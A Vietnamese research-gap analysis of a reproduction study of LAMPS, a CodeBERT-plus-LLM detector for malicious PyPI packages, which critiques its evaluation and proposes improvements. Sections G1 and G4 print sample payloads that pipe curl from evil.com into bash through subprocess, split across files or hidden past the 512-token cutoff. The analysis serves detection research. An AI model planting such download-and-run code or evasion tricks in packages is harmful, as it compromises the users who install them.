# Phân tích Research Gap — LAMPS (Zeshan et al., JSS 2026)

**Bài báo gốc:** *"Many hands make light work: An LLM-based multi-agent system for detecting malicious PyPI packages"*  
**Repo tái hiện:** https://github.com/NATuan1208/LAMPS-reproduce-IE105  
**Ngày phân tích:** 04/05/2026  
**Phương pháp:** 5-dimension evaluation (Novelty · Soundness · Rigor · Baseline · Reproducibility)

---

## Tổng quan nhanh

| # | Gap | Chiều | Impact | Novelty | Feasibility |
|---|-----|-------|--------|---------|-------------|
| G1 | File-level analysis bỏ qua cross-file context | Soundness | ★★★★★ | ★★★★★ | ★★★☆☆ |
| G2 | LLM agent không tham gia phân loại | Novelty | ★★★★☆ | ★★★★☆ | ★★★★☆ |
| G3 | Không đánh giá real-world class ratio | Rigor | ★★★★★ | ★★★☆☆ | ★★★★★ |
| G4 | Truncation 512 tokens bỏ sót tail payload | Soundness | ★★★☆☆ | ★★☆☆☆ | ★★★★★ |
| G5 | Không đánh giá temporal generalization | Rigor | ★★★★☆ | ★★★★☆ | ★★★★☆ |
| G6 | Dataset D2 không public — reproducibility crisis | Reproducibility | ★★★★★ | — | — |

---

## G1 — File-level analysis bỏ qua cross-file context (Quan trọng nhất)

### Tuyên bố của paper

Paper trình bày LAMPS như một hệ thống phát hiện package độc hại toàn diện, với kết quả 99.5% package-level accuracy trên D2.

### Vấn đề thực tế

Toàn bộ quyết định phân loại được thực hiện **trên từng file riêng lẻ**, độc lập hoàn toàn. Package-level verdict chỉ là phép OR đơn giản: *"nếu bất kỳ file nào bị classify là malicious thì cả package là malicious"*.

### Bằng chứng từ codebase

**`evaluation/run_d2_protocol.py`, dòng 70–91:**
```python
def _predict_batch(
    texts: list[str],      # ← list file contents, hoàn toàn độc lập
    tokenizer, model, device, threshold
) -> list[float]:
    encoded = tokenizer(
        texts,
        max_length=MAX_LENGTH,
        truncation=True,
        padding=True,
        return_tensors="pt",
    ).to(device)
    with torch.no_grad():
        logits = model(**encoded).logits
        ...
    return probs.cpu().tolist()
```

**`evaluation/run_d2_protocol.py`, dòng 196–212** — Package verdict:
```python
pkg_pred = 1 if any(r["predicted_label"] == 1 for r in pkg_file_results) else 0
```

Đây là phép OR đơn giản. Không có bất kỳ thông tin nào về quan hệ giữa các files trong package.

### Tấn công thực tế mà LAMPS bỏ sót

Kẻ tấn công tinh vi phân tán payload qua nhiều file:

```python
# __init__.py — Trông hoàn toàn vô hại:
from .utils import configure_env

# utils.py — Trông hoàn toàn vô hại:
def configure_env():
    from .internals import _bootstrap
    _bootstrap()

# internals.py — PAYLOAD thực sự:
def _bootstrap():
    import subprocess
    subprocess.Popen("curl http://evil.com/steal.sh | bash", shell=True)
```

CodeBERT phân loại từng file → `__init__.py` và `utils.py` → BENIGN. Nếu payload chia nhỏ đủ khéo, `internals.py` cũng có thể qua được threshold.

### Bằng chứng từ reproduction

12 False Positive packages của chúng ta (paramiko, ansible, pyinstaller...) là bằng chứng của vấn đề ngược: **các file hợp lệ trông giống malicious khi nhìn độc lập** — nhưng trong context của cả package thì hoàn toàn bình thường. Package-level graph sẽ sửa được cả FP lẫn distributed payload FN.

### Hướng cải thiện

**Package Dependency Graph + GNN:**
1. Parse AST từng `.py` file → extract `import`, function calls, `exec/eval` chains
2. Build directed graph trong package (node = file, edge = import/call relationship)
3. GNN aggregate CodeBERT embeddings qua cấu trúc graph
4. Classification tại package level thay vì file level

**Novelty:** Không có paper nào trong PyPI malware detection hiện tại dùng cross-file graph analysis.

---

## G2 — LLM Agent không tham gia vào phân loại

### Tuyên bố của paper

Tiêu đề paper: *"Many hands make light work"* — ngụ ý nhiều agent cùng đóng góp. Abstract mô tả LAMPS là "LLM-based **multi-agent system**".

### Vấn đề thực tế

LLM Agent (Meta-LLaMA 3) **hoàn toàn không tham gia vào quyết định phân loại**. Nó chỉ được gọi sau khi CodeBERT đã quyết định, để sinh ra giải thích tự nhiên ngữ.

### Bằng chứng từ codebase

**`llms/codebert_llm.py`, dòng 60–82** — Toàn bộ `call()` chỉ wrap CodeBERT:
```python
def call(self, prompt: Any, *args: Any, **kwargs: Any) -> str:
    code_text = self._extract_code(prompt)
    probability = self._predict_probability(code_text)   # ← chỉ CodeBERT
    prediction = "MALICIOUS" if probability >= self.threshold else "BENIGN"
    return json.dumps({
        "prediction": prediction,
        "probability": round(probability, 6),
    })
```

**`evaluation/run_d2_protocol.py`** — Import và usage: không có một dòng nào gọi LLM agent trong toàn bộ evaluation pipeline. File này chỉ dùng `transformers.AutoModelForSequenceClassification` thuần túy.

**Kiểm tra đơn giản:** Remove LLM agent khỏi hệ thống → accuracy **không thay đổi một bit**.

### Hệ quả

Câu hỏi Reviewer 2 sẽ hỏi:

> *"Table 3 shows 99.5% accuracy. Which part of this comes from the LLM agent? Is there an ablation study comparing CodeBERT-only vs. CodeBERT+LLM?"*

Paper không có ablation study nào về điều này. Tuyên bố "multi-agent" là **overclaim**.

### Hướng cải thiện


**Active LLM Verification (True 2-Agent Ensemble):**

```
CodeBERT confidence 0.0–0.35:  → BENIGN (high confidence, no LLM needed)
CodeBERT confidence 0.35–0.65: → UNCERTAIN → invoke LLM semantic analysis → LLM vote
CodeBERT confidence 0.65–1.0:  → MALICIOUS (high confidence, no LLM needed)

Final verdict = weighted combination of CodeBERT + LLM when both vote
```

Điều này biến LLM từ "commentator" thành "active voter" — đúng nghĩa multi-agent.

---

## G3 — Không đánh giá real-world class imbalance

### Tuyên bố của paper

D1: 3,000 malicious + 3,000 benign (1:1).  
D2: ~274 malicious + ~1,022 benign (~1:3.7).

Accuracy báo cáo: D1 = 97.7%, D2 = 99.5%.

### Vấn đề thực tế

Tỷ lệ thực tế trên PyPI: **~0.1–0.5% packages là malicious**, tức ~1:200 đến 1:1000. Cả hai dataset đều **không phản ánh real-world distribution**.

### Bằng chứng từ codebase

**`evaluation/metrics.py`, dòng 35–55** — Chỉ có standard metrics:
```python
def compute_metrics(y_true, y_pred) -> ClassificationMetrics:
    tp, tn, fp, fn = confusion_counts(y_true, y_pred)
    accuracy = (tp + tn) / total
    precision = tp / (tp + fp)
    recall = tp / (tp + fn)
    f1 = (2 * precision * recall / (precision + recall))
    balanced_accuracy = (recall + tnr) / 2.0
    ...
```

Không có một metric nào điều chỉnh theo prior distribution. Không có precision@recall curve. Không có Average Precision (AP).

### Tính toán thực tế

Giả sử deploy LAMPS thực tế với prior 1:200 (0.5% malicious), dùng threshold=0.90 (precision 95.10% trên D2 balanced):

```
Trong 201 packages: 1 malicious + 200 benign
  → Expected True Positives:  1 × 1.00 = 1.0
  → Expected False Positives: 200 × (1 − 0.951) = 9.8

Real-world Precision = 1.0 / (1.0 + 9.8) ≈ 9.3%
```

**Tức là 91% cảnh báo của LAMPS là false alarm** khi deploy thực tế. Paper không đề cập đến điều này.

### Hướng cải thiện

Thêm vào evaluation:
1. **Precision-Recall curve** thay vì single-point accuracy
2. **Average Precision (AP)** — metric chuẩn cho imbalanced detection
3. **Đánh giá tại realistic priors** (1:50, 1:100, 1:200)
4. Phân tích **Expected False Discovery Rate** theo Bayesian prior

Đây không cần train model mới — chỉ cần recompute metrics với adjusted priors.

---

## G4 — Truncation 512 tokens bỏ sót tail payload

### Tuyên bố của paper

Sử dụng CodeBERT với max_length chuẩn. Không có thảo luận về handling of long files.

### Vấn đề thực tế

Cả evaluation script và labeling script đều hard-code truncation tại 512 tokens. Tokenizer truncate từ phía **cuối** (không phải đầu) — nhưng thực ra `truncation=True` mặc định của HuggingFace truncate từ **cuối văn bản**, giữ lại phần đầu.

### Bằng chứng từ codebase

**`evaluation/run_d2_protocol.py`, dòng 34:**
```python
MAX_LENGTH = 512
```

**`scripts/codebert_label.py`, dòng 37:**
```python
MAX_LENGTH = 512
```

**`llms/codebert_llm.py`, dòng 21** — Thậm chí còn ngắn hơn trong agent wrapper:
```python
MAX_LENGTH: ClassVar[int] = 400
```

HuggingFace `truncation=True` mặc định giữ lại **512 tokens đầu tiên** và bỏ phần còn lại.

### Kỹ thuật evasion thực tế

```python
# File có 1500 token nội dung hợp lệ (math functions, docstrings, tests...)
# ... (512 tokens đầu hoàn toàn innocent) ...
# ... (token 513 trở đi — BỊ TRUNCATE):
import subprocess
_cmd = "curl http://evil.com | bash"
subprocess.Popen(_cmd, shell=True, 
    creationflags=0x08000000)  # CREATE_NO_WINDOW — ẩn process
```

CodeBERT chỉ thấy 512 tokens đầu → BENIGN. Payload hoàn toàn vô hình.

### Bằng chứng từ reproduction

Trong D2 v2, 117/782 files (15%) rơi vào uncertain zone (prob 0.10–0.90). Một phần trong số này có khả năng là files dài với payload bị truncate — CodeBERT không thấy đủ signal để classify rõ ràng.

### Hướng cải thiện

1. **Sliding window với max-pooling:** Chia file thành overlapping chunks 512 tokens, classify từng chunk, lấy max probability.
2. **Longformer/BigBird:** Models với context lên đến 4096 tokens. 
3. **Tail sampling:** Ngoài 512 tokens đầu, sample thêm 256 tokens cuối file — payloads thường ở cuối.

---

## G5 — Không đánh giá temporal generalization (Concept Drift)

### Tuyên bố của paper

Paper không đề cập đến cách train/test split được thực hiện theo thời gian.

### Vấn đề thực tế

Malware evolves. Attack patterns từ 2022 khác với 2025. Nếu train set và test set từ cùng thời điểm (random split), model "memorize" attack styles của giai đoạn đó. Khi deploy 6 tháng sau, accuracy thực tế sụt giảm.

### Bằng chứng từ paper và codebase

**Không có bất kỳ timestamp hay chronological split nào** trong codebase hiện tại. `run_d1_protocol.py` và `run_d2_protocol.py` đều chỉ đọc toàn bộ dataset mà không phân biệt thời gian.

**Thực tế:** DataDog dataset và `pypi_malregistry` đều có timestamps. Ví dụ DataDog structure:
```
samples/pypi/malicious_intent/{package}/{version}/{date}-{package}-v{version}.zip
                                                    ↑ date field tồn tại nhưng không được dùng
```

### So sánh với related work

Ibiyo et al. (2025) — paper mà LAMPS cite — có section về temporal evaluation. LAMPS không replicate điều này.

### Hướng cải thiện

1. **Chronological split:** Train trên packages trước 2024-01, test trên packages sau 2024-01
2. **Sliding window evaluation:** Evaluate theo từng quý để vẽ accuracy-over-time curve
3. **Few-shot adaptation:** Khi phát hiện concept drift (accuracy drop), fine-tune với 10–20 labeled examples mới
4. **Out-of-distribution detection:** Flag samples có embedding distance cao so với training distribution

---

## G6 — Dataset D2 không được public

### Vấn đề

Dataset D2 gốc **không được publish kèm paper**. Đây là vi phạm nghiêm trọng chuẩn mực reproducibility của JSS (Journal of Systems and Software).

### Bằng chứng trực tiếp từ reproduction

Toàn bộ effort của chúng ta phải rebuild D2 từ đầu:
- D2 v1 (labeling sai): 72.80% — thất bại hoàn toàn
- D2 v2 reconstruction pipeline: 5 scripts, ~8 giờ chạy
- D2 v2 (content-based labeling): 98.09% — gap 1.41pp còn lại

Gap 1.41pp **không thể loại bỏ hoàn toàn** vì chúng ta không có dataset gốc. Nếu paper publish dataset → reproduction gap có thể nhỏ hơn 0.1pp.

### Hệ quả cho cộng đồng

- Không researcher nào có thể reproduce chính xác D2 results
- Không thể so sánh công bằng với các method tương lai trên cùng benchmark
- JSS reproducibility policy yêu cầu artifact availability

---

## Tóm tắt: Ranking cơ hội cải thiện

### Nếu mục tiêu là viết paper mới / extend paper

**Lựa chọn 1 — Cao nhất (G1 + G2 kết hợp):**

> *"PackageBERT: Cross-file Graph Augmented CodeBERT with Active LLM Verification for PyPI Malware Detection"*

- Build call graph trong package → GNN trên CodeBERT embeddings → package-level classification
- LLM agent verify uncertain cases (0.35–0.65 confidence)
- Expected improvement: loại bỏ hoàn toàn 12 FP gap, phát hiện distributed payloads

**Lựa chọn 2 — Dễ nhất (G5):**

> *"Temporal Robustness Evaluation of LLM-based Malware Detection"*

- Dùng timestamps trong DataDog/pypi_malregistry để chronological split
- Đo concept drift theo thời gian
- Propose simple adaptation mechanism

### Nếu mục tiêu là cải thiện báo cáo hiện tại

**Lựa chọn 3 — Không cần code mới (G3):**
- Recompute D2 metrics tại priors 1:50, 1:100, 1:200
- Thêm Precision-Recall curve
- Section "Deployment Considerations" trong báo cáo

---

## Tài liệu tham khảo

1. Zeshan, U. et al. (2026). *Many hands make light work: An LLM-based multi-agent system for detecting malicious PyPI packages*. JSS.
2. Ibiyo, A. et al. (2025). *DataDog malicious-software-packages-dataset*.
3. Guo, L. et al. (2023). *An empirical study of malicious code in PyPI ecosystem*. ASE 2023.
4. Kipf, T. & Welling, M. (2017). *Semi-supervised classification with graph convolutional networks*. ICLR 2017. *(baseline cho GNN approach)*
5. Beltagy, I. et al. (2020). *Longformer: The long-document transformer*. *(baseline cho long-context approach)*

---

*File này được sinh tự động từ quá trình phân tích reproduction study. Evidence trích dẫn trực tiếp từ evaluation scripts và kết quả thực nghiệm.*
